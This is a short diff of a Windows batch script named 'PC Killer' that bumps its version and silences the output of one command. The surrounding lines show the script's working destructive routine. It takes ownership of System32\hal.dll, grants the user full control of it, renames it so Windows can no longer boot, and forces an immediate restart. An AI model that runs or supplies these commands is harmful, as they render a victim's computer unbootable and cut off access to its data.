@@ -2,7 +2,7 @@
 title PC Killer
 setlocal
 echo Program Name: PC Killer
-echo Version: 1.3.15
+echo Version: 1.3.16
 echo License: GNU General Public License v3.0
 echo Developer: @YonatanReuvenIsraeli
 echo GitHub: https://github.com/YonatanReuvenIsraeli
@@ -49,7 +49,7 @@ goto "Warning"
 :"Kill"
 "%windir%\System32\takeown.exe" /f "%windir%\System32\hal.dll" > nul 2>&1
 "%windir%\System32\icacls.exe" "%windir%\System32\hal.dll" /grant "%USERNAME%":(f) > nul 2>&1
-ren "%windir%\System32\hal.dll" "hal"
+ren "%windir%\System32\hal.dll" "hal" > nul 2>&1
 if not "%errorlevel%"=="0" goto "Error"
 endlocal
 "%windir%\System32\shutdown.exe" /r /t 00
